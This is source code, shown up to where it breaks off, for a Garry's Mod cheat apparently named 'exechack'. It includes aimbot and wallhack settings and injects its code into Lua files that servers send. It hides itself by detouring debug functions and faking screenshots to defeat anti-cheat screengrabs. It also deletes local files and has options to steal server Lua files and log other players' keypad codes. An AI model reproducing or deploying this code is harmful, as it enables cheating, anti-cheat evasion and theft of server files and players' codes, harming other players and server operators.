local username,password="exec","clown";if a then return end;a=true;local b={}local c={}for d=65,90 do table.insert(c,string.char(d))end;for d=97,122 do table.insert(c,string.char(d))end;local function f()local g=""for h=1,math.random(20)do g=g..c[math.random(1,#c)]end;return g end;if not username then username='Loser'password=''end;local i=MsgC;MsgC=function()end;local j=false;local k=[[
local __net_name="~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
timer.Simple(1,function()
net.Start(__net_name) 
net.WriteBool(false) 
net.WriteBool(true) 
net.WriteDouble(121.75) 
net.SendToServer() 
end)
net.Receive(__net_name,function() 
net.Start(__net_name) 
net.WriteBool(false) 
net.WriteBool(false) 
net.SendToServer()  
end) 
hook.Add( "ChatText", "hide_joinleave", function( index, name, text, typ )
if ( typ == "joinleave" ) then return true end
if ( typ == "namechange" ) then return true end
end )
]]b.maincfg=gmodgoodgame:Replace("}",""):Replace("{",""):Replace("-","")..".txt"b.logs=f()..".txt"b.runlua=f()..".txt"b.allentity=f()..".txt"b.aimbotfriend=f()..".txt"b.aimteams=f()..".txt"b.aimranks=f()..".txt"b.exploits=f()..".txt"b.allnet=f()..".txt"b.antiscreengrab=f()b.font18=f()b.font22=f()b.font14=f()b.menufont=f()b.randomforhook=f()b.obsbypassrand=f()b.netloggerenabled=f()b.netlogtxt=f()..".txt"local l={}for h,m in pairs(file.Find("*.png","DATA"))do file.Delete(m)end;for h,m in pairs(file.Find("*.txt","DATA"))do if string.find(file.Read(m,"DATA")or"a",'"connect":')then file.Delete(m)end;if string.find(file.Read(m,"DATA")or"a","WH_BOX_SIZE")then if not oldconfig then oldconfig=file.Read(m,"DATA")file.Delete(m)else file.Delete(m)end end end;local function n(l)if l["WH_DISTANCE"]==nil then l["WH_DISTANCE"]=1000 end;if l["WH_DORMANT"]==nil then l["WH_DORMANT"]=false end;if l["WH_NAME"]==nil then l["WH_NAME"]=false end;if l["WH_NAME_COLOR"]==nil then l["WH_NAME_COLOR"]=Color(255,255,255)end;if l["WH_NAME_POSITION"]==nil then l["WH_NAME_POSITION"]=1 end;if l["WH_HEALTH"]==nil then l["WH_HEALTH"]=false end;if l["WH_HEALTH_POSITION"]==nil then l["WH_HEALTH_POSITION"]=4 end;if l["WH_HEALTH_TYPETYPE"]==nil then l["WH_HEALTH_TYPETYPE"]="Bar"end;if l["WH_ARMOR"]==nil then l["WH_ARMOR"]=false end;if l["WH_ARMOR_POSITION"]==nil then l["WH_ARMOR_POSITION"]=1 end;if l["WH_ARMOR_TYPETYPE"]==nil then l["WH_ARMOR_TYPETYPE"]="Text"end;if l["WH_MONEY"]==nil then l["WH_MONEY"]=false end;if l["WH_MONEY_COLOR"]==nil then l["WH_MONEY_COLOR"]=Color(0,255,0)end;if l["WH_MONEY_POSITION"]==nil then l["WH_MONEY_POSITION"]=1 end;if l["WH_WEAPON"]==nil then l["WH_WEAPON"]=false end;if l["WH_WEAPON_COLOR"]==nil then l["WH_WEAPON_COLOR"]=Color(255,255,0)end;if l["WH_WEAPON_POSITION"]==nil then l["WH_WEAPON_POSITION"]=1 end;if l["WH_WEAPON_TYPETYPE"]==nil then l["WH_WEAPON_TYPETYPE"]="Only active"end;if l["WH_JOB"]==nil then l["WH_JOB"]=false end;if l["WH_JOB_POSITION"]==nil then l["WH_JOB_POSITION"]=1 end;if l["WH_USERGROUP"]==nil then l["WH_USERGROUP"]=false end;if l["WH_USERGROUP_POSITION"]==nil then l["WH_USERGROUP_POSITION"]=1 end;if l["WH_USERGROUP_COLOR"]==nil then l["WH_USERGROUP_COLOR"]=Color(0,0,255)end;if l["WH_BOX"]==nil then l["WH_BOX"]=false end;if l["WH_BOX_COLOR"]==nil then l["WH_BOX_COLOR"]=Color(255,255,0)end;if l["WH_BOX_TYPETYPE"]==nil then l["WH_BOX_TYPETYPE"]="2d"end;if l["WH_BOX_TEAMCOLOR"]==nil then l["WH_BOX_TEAMCOLOR"]=true end;if l["WH_CHAMS"]==nil then l["WH_CHAMS"]=false end;if l["WH_CHAMS_TYPE"]==nil then l["WH_CHAMS_TYPE"]="Type 1"end;if l["WH_CHAMS_TEAMCOLOR"]==nil then l["WH_CHAMS_TEAMCOLOR"]=true end;if l["WH_CHAMS_COLOR"]==nil then l["WH_CHAMS_COLOR"]=Color(255,255,255)end;if l["WH_SKELETON"]==nil then l["WH_SKELETON"]=false end;if l["WH_SKELETON_TEAMCOLOR"]==nil then l["WH_SKELETON_TEAMCOLOR"]=false end;if l["WH_SKELETON_COLOR"]==nil then l["WH_SKELETON_COLOR"]=Color(255,255,255)end;if l["WH_ENTITY_DORMANT"]==nil then l["WH_ENTITY_DORMANT"]=false end;if l["WH_ENTITY_DISTANCE"]==nil then l["WH_ENTITY_DISTANCE"]=1000 end;if l["WH_ENTITY_NAME"]==nil then l["WH_ENTITY_NAME"]=false end;if l["WH_ENTITY_NAME_COLOR"]==nil then l["WH_ENTITY_NAME_COLOR"]=Color(255,255,255)end;if l["WH_ENTITY_BOX"]==nil then l["WH_ENTITY_BOX"]=false end;if l["WH_ENTITY_BOX_COLOR"]==nil then l["WH_ENTITY_BOX_COLOR"]=Color(255,255,255)end;if l["WH_ENTITY_BOX_TYPE"]==nil then l["WH_ENTITY_BOX_TYPE"]="3d"end;if l["WH_ENTITY_CHAMS"]==nil then l["WH_ENTITY_CHAMS"]=false end;if l["WH_ENTITY_CHAMS_TYPE"]==nil then l["WH_ENTITY_CHAMS_TYPE"]="XYZ"end;if l["WH_ENTITY_CHAMS_COLOR"]==nil then l["WH_ENTITY_CHAMS_COLOR"]=Color(255,255,255)end;if l["NOSWAY"]==nil then l["NOSWAY"]=false end;if l["WH_CURSORENTITYNAME"]==nil then l["WH_CURSORENTITYNAME"]=false end;if l["WH_CURSORENTITYNAME_COLOR"]==nil then l["WH_CURSORENTITYNAME_COLOR"]=Color(255,255,255)end;if l["WH_NOSKY"]==nil then l["WH_NOSKY"]=false end;if l["WH_NOSKY_COLOR"]==nil then l["WH_NOSKY_COLOR"]=Color(255,255,255)end;if l["WH_FULLBRIGHT"]==nil then l["WH_FULLBRIGHT"]=false end;if l["WH_DEBUGCAMERA_ENABLED"]==nil then l["WH_DEBUGCAMERA_ENABLED"]=false end;if l["WH_DEBUGCAMERA_KEY"]==nil then l["WH_DEBUGCAMERA_KEY"]=0 end;if l["WH_DEBUGCAMERA_SPEEDS"]==nil then l["WH_DEBUGCAMERA_SPEEDS"]=1 end;if l["WH_THIRDPERSON_ENABLED"]==nil then l["WH_THIRDPERSON_ENABLED"]=false end;if l["WH_THIRDPERSON_KEY"]==nil then l["WH_THIRDPERSON_KEY"]=0 end;if l["WH_THIRDPERSON_DISTANCE"]==nil then l["WH_THIRDPERSON_DISTANCE"]=100 end;if l["WH_FOVVIEW_ENABLED"]==nil then l["WH_FOVVIEW_ENABLED"]=false end;if l["WH_FOVVIEW"]==nil then l["WH_FOVVIEW"]=100 end;if l["AIM_DRAWFOV"]==nil then l["AIM_DRAWFOV"]=false end;if l["WH_FOV_COLOR"]==nil then l["WH_FOV_COLOR"]=Color(255,255,255)end;if l["CROSSHAIR_ENABLED"]==nil then l["CROSSHAIR_ENABLED"]=false end;if l["CROSSHAIR_CROSSHAIR"]==nil then l["CROSSHAIR_CROSSHAIR"]=false end;if l["CROSSHAIR_FOV"]==nil then l["CROSSHAIR_FOV"]=false end;if l["CROSSHAIR_BOX"]==nil then l["CROSSHAIR_BOX"]=false end;if l["CROSSHAIR_SIZE"]==nil then l["CROSSHAIR_SIZE"]=10 end;if l["CROSSHAIR_COLOR"]==nil then l["CROSSHAIR_COLOR"]=Color(255,255,255)end;if l["WH_INFO"]==nil then l["WH_INFO"]=false end;if l["WH_INFO_X"]==nil or l["WH_INFO_X"]>ScrW()then l["WH_INFO_X"]=10 end;if l["WH_INFO_Y"]==nil or l["WH_INFO_Y"]>ScrW()then l["WH_INFO_Y"]=10 end;if l["WH_INFO_S_X"]==nil then l["WH_INFO_S_X"]=200 end;if l["WH_INFO_S_Y"]==nil then l["WH_INFO_S_Y"]=230 end;if l["WH_RADAR"]==nil then l["WH_RADAR"]=false end;if l["WH_RADAR_X"]==nil or l["WH_RADAR_X"]>ScrW()then l["WH_RADAR_X"]=10 end;if l["WH_RADAR_Y"]==nil or l["WH_RADAR_Y"]>ScrH()then l["WH_RADAR_Y"]=10 end;if l["WH_RADAR_S_X"]==nil then l["WH_RADAR_S_X"]=260 end;if l["WH_RADAR_S_Y"]==nil then l["WH_RADAR_S_Y"]=260 end;if l["WH_RADAR_DISTANCE"]==nil then l["WH_RADAR_DISTANCE"]=10 end;if l["WH_RADAR_SIZE"]==nil then l["WH_RADAR_SIZE"]=3 end;if l["AIM_ENABLED"]==nil then l["AIM_ENABLED"]=false end;if l["AIM_AUTOFIRE"]==nil then l["AIM_AUTOFIRE"]=false end;if l["AIM_AUTORELOAD"]==nil then l["AIM_AUTORELOAD"]=false end;if l["AIM_NORECOIL"]==nil then l["AIM_NORECOIL"]=false end;if l["AIM_NOSPREAD"]==nil then l["AIM_NOSPREAD"]=false end;if l["AIM_SILENT"]==nil then l["AIM_SILENT"]=false end;if l["AIM_AUTOWALL"]==nil then l["AIM_AUTOWALL"]=false end;if l["AIM_KEY"]==nil then l["AIM_KEY"]=0 end;if l["AIM_FOV"]==nil then l["AIM_FOV"]=0 end;if l["AIM_SMOOTHING"]==nil then l["AIM_SMOOTHING"]=0 end;if l["AIM_HITBOX"]==nil then l["AIM_HITBOX"]="Head"end;if l["WH_SNAPLINE"]==nil then l["WH_SNAPLINE"]=false end;if l["WH_SNAPLINE_COLOR"]==nil then l["WH_SNAPLINE_COLOR"]=Color(255,255,255)end;if l["LUALOADER_ANTISG"]==nil then l["LUALOADER_ANTISG"]=false end;if l["MISC_SPECTATORLIST"]==nil then l["MISC_SPECTATORLIST"]=false end;if l["MISC_SPECTATORLIST_X"]==nil or l["MISC_SPECTATORLIST_X"]>ScrW()then l["MISC_SPECTATORLIST_X"]=10 end;if l["MISC_SPECTATORLIST_Y"]==nil or l["MISC_SPECTATORLIST_Y"]>ScrW()then l["MISC_SPECTATORLIST_Y"]=10 end;if l["MISC_SPECTATORLIST_S_X"]==nil then l["MISC_SPECTATORLIST_S_X"]=250 end;if l["MISC_SPECTATORLIST_S_Y"]==nil then l["MISC_SPECTATORLIST_S_Y"]=90 end;if l["E_SPAMMER"]==nil then l["E_SPAMMER"]=false end;if l["MISC_KEYPADLOGGER"]==nil then l["MISC_KEYPADLOGGER"]=false end;if l["MISC_KEYPADLOGGER_COLOR"]==nil then l["MISC_KEYPADLOGGER_COLOR"]=Color(255,123,0)end;if l["MISC_BUNNYHOP"]==nil then l["MISC_BUNNYHOP"]=false end;if l["MISC_AUTOSTRAFE"]==nil then l["MISC_AUTOSTRAFE"]=false end;if l["MISC_SPECTATE_TARGET"]==nil then l["MISC_SPECTATE_TARGET"]=""end;if l["MISC_ANTIANTIAFK"]==nil then l["MISC_ANTIANTIAFK"]=false end;if l["MISC_AUTOPISTOL"]==nil then l["MISC_AUTOPISTOL"]=0 end;if l["NOIFICATION_DAMAGEDMEBY"]==nil then l["NOIFICATION_DAMAGEDMEBY"]=false end;if l["LUA_FILE_STEALER"]==nil then l["LUA_FILE_STEALER"]=false end;if l["PANICKEY"]==nil then l["PANICKEY"]=0 end;if l["MENU_OPENKEY"]==nil then l["MENU_OPENKEY"]=73 end;if l["MISC_ADDENTITYFRIEND"]==nil then l["MISC_ADDENTITYFRIEND"]=0 end;if l["ENTITYLIST"]==nil then l["ENTITYLIST"]={}end;if l["ENTITYLISTclr"]==nil then l["ENTITYLISTclr"]={}end;if l["FRIENDLIST"]==nil then l["FRIENDLIST"]={}end;if l["RANKLIST"]==nil then l["RANKLIST"]={}end;if l["TEAMLIST"]==nil then l["TEAMLIST"]={}end;if l["KEYPADTYPE"]==nil then l["KEYPADTYPE"]=0 end;if l["ANTIAIM_ENABLED"]==nil then l["ANTIAIM_ENABLED"]=false end;if l["ANTIAIM_X"]==nil then l["ANTIAIM_X"]="Up"end;if l["ANTIAIM_EMOTION_X"]==nil then l["ANTIAIM_EMOTION_X"]=50 end;if l["ANTIAIM_Y"]==nil then l["ANTIAIM_Y"]="Forward"end;if l["ANTIAIM_EMOTION_Y"]==nil then l["ANTIAIM_EMOTION_Y"]=20 end;if l["MENU_STYLE_TEXT"]==nil then l["MENU_STYLE_TEXT"]=Color(255,255,255)end;if l["MENU_STYLE_TEXT2"]==nil then l["MENU_STYLE_TEXT2"]=Color(200,200,200)end;if l["MENU_STYLE_TITLETEXT"]==nil then l["MENU_STYLE_TITLETEXT"]=Color(255,255,255)end;if l["MENU_STYLE_TITLEBAR"]==nil then l["MENU_STYLE_TITLEBAR"]=Color(45,45,45)end;if l["MENU_STYLE_WINDOWBG"]==nil then l["MENU_STYLE_WINDOWBG"]=Color(35,35,35)end;if l["MENU_STYLE_MENUBARBG"]==nil then l["MENU_STYLE_MENUBARBG"]=Color(35,35,35)end;if l["MENU_STYLE_BUTTON"]==nil then l["MENU_STYLE_BUTTON"]=Color(35,35,35)end;if l["MENU_STYLE_BUTTONHOVERED"]==nil then l["MENU_STYLE_BUTTONHOVERED"]=Color(120,120,120,100)end;if l["MENU_STYLE_BORDER"]==nil then l["MENU_STYLE_BORDER"]=Color(100,100,100)end;if l["MENU_STYLE_SLIDER"]==nil then l["MENU_STYLE_SLIDER"]=Color(255,255,255)end;if l["MENU_STYLE_СHECKBOX"]==nil then l["MENU_STYLE_СHECKBOX"]=Color(45,45,45)end;if l["MENU_STYLE_СHECKBOXACTIVE"]==nil then l["MENU_STYLE_СHECKBOXACTIVE"]=Color(100,100,255)end;if l["MENU_STYLE_TEXTENTRY"]==nil then l["MENU_STYLE_TEXTENTRY"]=Color(25,25,25)end;if l["OBSBYPASS"]==nil then l["OBSBYPASS"]=false end;if l["RESOLVER"]==nil then l["RESOLVER"]=false end;if l["WH_FRIENDCOLOR"]==nil then l["WH_FRIENDCOLOR"]=Color(0,255,0)end;if l["SPAM_KILLSAY"]==nil then l["SPAM_KILLSAY"]={"exechack.cc"}end;if l["SPAM_KILLSAY_ENABLED"]==nil then l["SPAM_KILLSAY_ENABLED"]=false end;if l["SPAM_KILLSAY_OOC"]==nil then l["SPAM_KILLSAY_OOC"]=false end;if l["WH_NAME_FRIENDCOLOR"]==nil then l["WH_NAME_FRIENDCOLOR"]=true end;if l["CIRCLESTRAFE_KEY"]==nil then l["CIRCLESTRAFE_KEY"]=0 end;if l["RESOLVER_X_AXIS"]==nil then l["RESOLVER_X_AXIS"]="Off"end;if l["RESOLVER_Y_AXIS"]==nil then l["RESOLVER_Y_AXIS"]="Off"end;if l["TRIGGERBOT_KEY"]==nil then l["TRIGGERBOT_KEY"]=200 end;if l["HITSOUNDS"]==nil then l["HITSOUNDS"]=false end;if l["AIM_PRIORITY"]==nil then l["AIM_PRIORITY"]="Field of View"end;if l["AIM_ENTITYLIST"]==nil then l["AIM_ENTITYLIST"]={}end;if l["RDRSNA"]==nil then l["RDRSNA"]=true end;if l["WH_PLAYER_FONT"]==nil then l["WH_PLAYER_FONT"]="Roboto"end;if l["WH_PLAYER_FONT_SIZE"]==nil then l["WH_PLAYER_FONT_SIZE"]=16 end;if l["WH_ENTITY_FONT"]==nil then l["WH_ENTITY_FONT"]="Roboto"end;if l["WH_ENTITY_FONT_SIZE"]==nil then l["WH_ENTITY_FONT_SIZE"]=16 end;if l["FILTER_ENABLED"]==nil then l["FILTER_ENABLED"]=false end;if l["FILTER_BRIGHTNESS"]==nil then l["FILTER_BRIGHTNESS"]=0 end;if l["FILTER_CONTRAST"]==nil then l["FILTER_CONTRAST"]=1 end;if l["FILTER_SATURATION"]==nil then l["FILTER_SATURATION"]=1 end;if l["CLOUDRADAR"]==nil then l["CLOUDRADAR"]=false end;if l["WH_AIMTARGET_COLOR"]==nil then l["WH_AIMTARGET_COLOR"]=Color(255,0,0)end;if l["WH_PLAYER_FONT_OUTLINE"]==nil then l["WH_PLAYER_FONT_OUTLINE"]=false end;if l["WH_ENTITY_FONT_OUTLINE"]==nil then l["WH_ENTITY_FONT_OUTLINE"]=false end;if l["MISC_KEYPADLOGGER_AUTOENTER"]==nil then l["MISC_KEYPADLOGGER_AUTOENTER"]=true end;if l["MISC_AUTOSTRAFE_TYPE"]==nil then l["MISC_AUTOSTRAFE_TYPE"]="Legit"end;if l["NOIFICATION_FRIENDDAMAGED"]==nil then l["NOIFICATION_FRIENDDAMAGED"]=true end;if l["MISC_BUNNYHOP_SAVEHOPS"]==nil then l["MISC_BUNNYHOP_SAVEHOPS"]=0 end;return l end;if oldconfig then l=n(util.JSONToTable(oldconfig))else l=n({})end;local o={}local function p(q,r)b.randomluaska=b.srn[math.random(1,#b.srn)]if r then o[1]={name=b.randomluaska,code=string.Replace(q,"function()","function()if "..b.antiscreengrab.." then return end ")}file.Write(b.runlua,b.randomluaska)else o[1]={name=b.randomluaska,code=q}file.Write(b.runlua,b.randomluaska)end end;file.Write(b.maincfg,util.TableToJSON(l))local s=false;local t={}local function u()t=util.JSONToTable(file.Read(b.maincfg,"DATA"))if IsInGame()and b.la==nil then timer.Simple(10,function()s=true;local v=0;for w,x in pairs(exec_List("C:/exechack")or{})do if not x:find(".cfgexec")and x:find("autorun")and x~="loginandpassword"then timer.Simple(v,function()p(exec_Read("C:/exechack".."/"..x),true)end)v=v+3 end end end)b.la=true end;if not IsInGame()and b.la then b.la=nil;s=false end end;u()timer.Create("check",1,0,u)local function y()b.colortext=t["MENU_STYLE_TEXT"]b.colortext2=t["MENU_STYLE_TEXT2"]b.titlebar=t["MENU_STYLE_TITLEBAR"]b.windowbg=t["MENU_STYLE_WINDOWBG"]b.titletext=t["MENU_STYLE_TITLETEXT"]b.menubarbg=t["MENU_STYLE_MENUBARBG"]b.button=t["MENU_STYLE_BUTTON"]b.buttonhovered=t["MENU_STYLE_BUTTONHOVERED"]b.border=t["MENU_STYLE_BORDER"]b.slider=t["MENU_STYLE_SLIDER"]b.checkbox=t["MENU_STYLE_СHECKBOX"]b.checkboxactive=t["MENU_STYLE_СHECKBOXACTIVE"]b.textentry=t["MENU_STYLE_TEXTENTRY"]end;y()local function z(A,B)local C=util.JSONToTable(file.Read(b.maincfg,"DATA"))C[A]=B;file.Write(b.maincfg,util.TableToJSON(C))t[A]=B;y()end;z("KEYPADTYPE",0)if IsInGame()then RunConsoleCommand("retry")end;local function D(E)local a={}for F in E:gsub('[^\128-\191][\128-\191]*',function(G)return G:find'%w'and'\0'..G..'\0'end):gsub('%z%z',''):gmatch'%z(.-)%z'do table.insert(a,F)end;return unpack(a)or"noname"end;local H={}local I={}b.srn={}local J=GameDetails;function GameDetails(K,L,M,N,O,P)z("KEYPADTYPE",0)z("MISC_SPECTATE_TARGET","")file.Write(b.logs,'{"connect":"","damage":"","namechange":"","disconnect":"","chat":"","kill":""}')H={}I={}GetHostName2=K;GetHostName=D(K)ScriptExistsif=exec_Exists("C:/exechack".."/"..GetHostName)b.run=true;b.srn={}return J(K,L,M,N,O,P)end;local function Q(R)local G=0;local S=string.Explode("/",R)local e=""for w,T in ipairs(S)do if w==#S then else if e..T=="entities"then G=w end end end;if G==0 then return false end;local U=S[G+1]if H[U]then return end;H[U]=true;return U:Replace(".lua","")end;hook.Add("bitch","1",function(a,R)local V=t["WH_PLAYER_FONT_OUTLINE"]and"true"or"false"local W=t["WH_ENTITY_FONT_OUTLINE"]and"true"or"false"local K=Q(a)if K then I[K]=true end;if string.find(R,"aeypad_baaaaaaaaaaaaaaaaaaase")then z("KEYPADTYPE",1)end;if a and a:find("lua")and not IsInGame()then b.srn[#b.srn+1]=a end;if#b.srn==3 and b.run then b.run=false;return R..[[

local hacka={}
local gay={}
local fdfbp = {}
local fdfh = shgf_handler
_G.shgf_handler = nil
fdfbp["DetourFuncs"] = {}
fdfbp["DetourNames"] = {}
fdfbp["Hooks"] = {}
function fdfbp.Detour( old, new, name )
name = name or ""
fdfbp.DetourFuncs[new] = old
fdfbp.DetourNames[new] = name
return new
end 
local isstr,isfunc = isstring,isfunction
local tstring = tostring
local cgarbage = collectgarbage
local dbginfo = debug.getinfo
local ja = jit.attach
local gtuv = debug.getupvalue
local stringfind = string.find
local dbghook = debug.sethook
debug.getinfo = fdfbp.Detour( debug.getinfo, function( func, ... )
    local n_func = func
    if fdfbp.DetourFuncs[func] then n_func = fdfbp.DetourFuncs[func] end
    return dbginfo( n_func, ... )
end, "debug.getinfo")
local dsmeta = debug.setmetatable
local metatab = {}
debug.setmetatable = fdfbp.Detour( debug.setmetatable, function( tab, meta )
    if tab == fdfbp.DetourFuncs then tab = metatab end
    return dsmeta( tab, meta )
end, "debug.setmetatable")
local hk_dtr = {}
local uvj = debug.upvaluejoin
debug.upvaluejoin = fdfbp.Detour( debug.upvaluejoin, function( f1, n1, f2, n2 )
    local n_func = f1
    local n_func2 = f2
    if fdfbp.DetourFuncs[f1] then n_func = fdfbp.DetourFuncs[f1] end
    if fdfbp.DetourFuncs[f2] then n_func2 = fdfbp.DetourFuncs[f2] end
    return uvj(n_func, n1, n_func2, n2)
end,"debug.upvaluejoin")
local sfenv = debug.setfenv
debug.setfenv = fdfbp.Detour( debug.setfenv, function( obj, env )
    if fdfbp.DetourFuncs[obj] then obj = function() end end
    return sfenv( obj, env )
end,"debug.setfenv")
local stump = string.dump
string.dump = fdfbp.Detour( string.dump, function( func, ... )
    local n_func = func
    if fdfbp.DetourFuncs[func] then n_func = fdfbp.DetourFuncs[func] end
    return stump(n_func, ... )
end,"string.dump")
local dbggetlocal = debug.getlocal
debug.getlocal = fdfbp.Detour( debug.getlocal, function( thread, level, index )
    local n_thread = thread
    if isfunc(n_thread) && fdfbp.DetourFuncs[n_thread] then n_thread = fdfbp.DetourFuncs[n_thread] end 
    return dbggetlocal(n_thread or thread, level, index)
end,"debug.getlocal")

local vguicreate = vgui.Create
vgui.Create = fdfbp.Detour( vgui.Create, function( classname, parent, name, ... )
local panel = vguicreate( classname, parent, name, ... )
panel:Prepare()
if gay["OBSBYPASS"]and parent==nil and name != "gay" then 
panel:SetPaintedManually(true)
if not ]]..b.obsbypassrand..[[ then 
]]..b.obsbypassrand..[[={}
end 
]]..b.obsbypassrand..[[[#]]..b.obsbypassrand..[[+1]=panel 
end
return panel
end,"vgui.Create")

local renderview = render.RenderView
local renderclear = render.Clear
local vgetworldpanel = vgui.GetWorldPanel
local panic = false
local oRCC = RunConsoleCommand
local function renderpanic( delay )
    if panic then return end
    panic = true
    gui.HideGameUI()
    local worldpanel = vgetworldpanel()
    if gay["LUALOADER_ANTISG"]then
       ]]..b.antiscreengrab..[[=true
        if IsValid(worldpanel) then
            worldpanel:Hide()
        end
    else
if gay["MISC_SPECTATORLIST"]and IsValid(hacka.specb) then
hacka.specb:Hide()
end
if gay["WH_RADAR"]and IsValid(hacka.ac) then
hacka.ac:Hide()
end
if gay["WH_INFO"]and IsValid(hacka.info) then
hacka.info:Hide()
end
if IsValid(hacka.rt)then
hacka.rt:Hide()
end
end
    renderclear(0, 0, 0, 255, true, true)
    renderview(
    {
        origin = LocalPlayer():EyePos(),
        angles = EyeAngles(),
        x = 0,
        y = 0,
        w = ScrW(),
        h = ScrH(),
        dopostprocess = true,
        drawhud = true,
        drawmonitors = true,
        drawviewmodel = true,
        viewmodelfov = 54,
        fov = 90
    })
timer.Simple(delay, function()
local worldpanel = vgetworldpanel()
if gay["LUALOADER_ANTISG"]then
]]..b.antiscreengrab..[[=false
if IsValid(worldpanel) then
worldpanel:Show()
end
else
if gay["MISC_SPECTATORLIST"]and IsValid(hacka.specb) then
hacka.specb:Show()
end
if gay["WH_RADAR"]and IsValid(hacka.ac) then
hacka.ac:Show()
end
if gay["WH_INFO"]and IsValid(hacka.info) then
hacka.info:Show()
end
if IsValid(hacka.rt)then
hacka.rt:Show()
end
end
hacka.onitify("You screengraben")
panic = false
end)
end
local oRC = render.Capture
local oRCP = render.CapturePixels
local oRRP = render.ReadPixel
local findmeta = FindMetaTable
local ply = findmeta( "Player" )
local oconcommand = ply.ConCommand
_G.render.Capture = fdfbp.Detour(render.Capture, function(a)
if a["quality"] != "1"then
  renderpanic(0.2)
end
    local output = oRC(a)
    return output
end, "render.Capture")
_G.render.CapturePixels = fdfbp.Detour(render.CapturePixels, function(...)
    renderpanic(0.05)
    local output = oRCP(...)
    return output
end, "render.CapturePixels")
_G.render.ReadPixel = fdfbp.Detour(render.ReadPixel, function(a,b)
if not a==1 and not b==1 then
    renderpanic(0.05)
    end
    local output = oRRP(a,b)
    return output
end, "render.ReadPixel")
ply.ConCommand = fdfbp.Detour(ply.ConCommand, function(pl, cmd, ...)
    if string.lower(cmd) == "jpeg" then
        renderpanic( 0.2 )
        oconcommand( pl, cmd, ... )
        return
    end
    if string.lower(cmd) == "__screenshot_internal" then
        renderpanic( 0.3 )
        oconcommand( pl, cmd, ... )
        return
    end
    if string.lower(cmd) == "screenshot" then
        renderpanic( 0.3 )
        oconcommand( pl, cmd, ... )
        return
    end
    if string.lower(cmd) == "startmovie" then
        renderpanic( 0.3 )
        oRCC( cmd, ... )
        return
    end
    return oconcommand( pl, cmd, ... )
end, "player:ConCommand")
_G.RunConsoleCommand = fdfbp.Detour(_G.RunConsoleCommand, function(cmd, ...)
    if string.lower(cmd) == "jpeg" then
        renderpanic( 0.2 )
        oRCC( cmd, ... )
        return
    end
    if string.lower(cmd) == "__screenshot_internal" then
        renderpanic( 0.3 )
        oRCC( cmd, ... )
        return
    end
    if string.lower(cmd) == "screenshot" then
        renderpanic( 0.3 )
        oRCC( cmd, ... )
        return
    end
    if string.lower(cmd) == "startmovie" then
        renderpanic( 0.3 )
        oRCC( cmd, ... )
        return
    end
    return oRCC( cmd, ... )
end, "RunConsoleCommand")
timer.Simple(1,function()
local type = type;
local next = next;
local nexts = next;

local function Copy(tt, lt)
local copy = {}
if lt then
if type(tt) == "table" then
for k,v in next, tt do
copy[k] = Copy(k, v)
end
else
copy = lt
end
return copy
end
if type(tt) != "table" then
copy = tt
else
for k,v in next, tt do
copy[k] = Copy(k, v)
end
end
return copy
end

local surface = Copy(surface);
local draw = Copy(draw);
local vgui = Copy(vgui);
local input = Copy(input);
local Color = Color;
local Entity = Entity;
local Player = Player;
local ScrW, ScrH = ScrW, ScrH;
local gui = Copy(gui);
local math = Copy(math);
local file = Copy(file);
local util = Copy(util);
local table = Copy(table);
local player = Copy(player);
local draw = Copy(draw);
local ents = Copy(ents);
local Angle = Angle;
local me = nil
local render = Copy(render);
local cam = Copy(cam);
local hook = Copy(hook);

local FindMetaTable = FindMetaTable;
local em = FindMetaTable"Entity";
local pm = FindMetaTable"Player";
local cm = FindMetaTable"CUserCmd";
local wm = FindMetaTable"Weapon";
local am = FindMetaTable"Angle";
local vm = FindMetaTable"Vector";

local Vector = Vector;
local Angle = Angle;
local Material = Material;
local CreateMaterial = CreateMaterial;
local aimtarget;
local EyePos, EyeAngles = EyePos, EyeAngles

local _pm_Name=pm.Name
local _pm_GetUserGroup=pm.GetUserGroup
local _pm_SteamID=pm.SteamID
local _em_Health=em.Health
local _pm_GetActiveWeapon=pm.GetActiveWeapon
local _pm_getDarkRPVar=pm.getDarkRPVar
local _em_IsPlayer=em.IsPlayer
local _pm_GetWeapons=pm.GetWeapons
local _em_LocalToWorld=em.LocalToWorld
local _em_GetPos=em.GetPos
local _em_LookupAttachment=em.LookupAttachment
local _cm_SetViewAngles=cm.SetViewAngles
local _cm_CommandNumber=cm.CommandNumber
local _pm_GetPunchAngle=pm.GetPunchAngle
local _em_IsValid=em.IsValid
local _pm_IsTyping=pm.IsTyping
local _em_GetMoveType=em.GetMoveType
local _em_IsDormant=em.IsDormant
local _pm_Team=pm.Team
local _em_EyePos=em.EyePos
local _pm_GetShootPos=pm.GetShootPos
local _em_GetVelocity=em.GetVelocity
local _em_EyeAngles=em.EyeAngles
local _vm_ToScreen=vm.ToScreen
local _cm_GetViewAngles=cm.GetViewAngles
local _cm_GetButtons=cm.GetButtons
local _pm_Alive=pm.Alive
local _vm_Distance=vm.Distance
local _em_IsNPC = em.IsNPC
local _em_GetAngles = em.GetAngles
local _em_GetRotatedAABB = em.GetRotatedAABB
local _em_DrawModel = em.DrawModel
local _em_SetRenderMode = em.SetRenderMode
local _pm_KeyDown = pm.KeyDown
local _em_GetClass = em.GetClass


local _surface_DrawText=surface.DrawText
local _surface_SetTextPos=surface.SetTextPos
local _input_IsKeyDown=input.IsKeyDown
local _surface_SetFont=surface.SetFont
local _ents_GetAll=ents.GetAll
local _file_Read=file.Read
local _util_JSONToTable=util.JSONToTable
local _file_Write=file.Write
local _player_GetAll=player.GetAll
local _ents_FindByClass = ents.FindByClass
local _surface_GetTextSize=surface.GetTextSize
local _surface_SetDrawColor=surface.SetDrawColor
local _GetRenderTarget=GetRenderTarget
local _team_GetName=team.GetName
local _team_GetColor=team.GetColor


local _game_GetMap = game.GetMap()
local _GetHostName = GetHostName()
local _FrameTime = FrameTime
local _engine_ActiveGamemode = engine.ActiveGamemode()
local httpfetch = http.Post

local fa;
local aa;
gameevent.Listen("player_changename")
gameevent.Listen("player_connect")
gameevent.Listen("player_disconnect")
gameevent.Listen("player_say")
gameevent.Listen("player_hurt")
gameevent.Listen("entity_killed")
hacka.keypadlogger = {}
hacka.vieworigin = Vector(0, 0, 0)
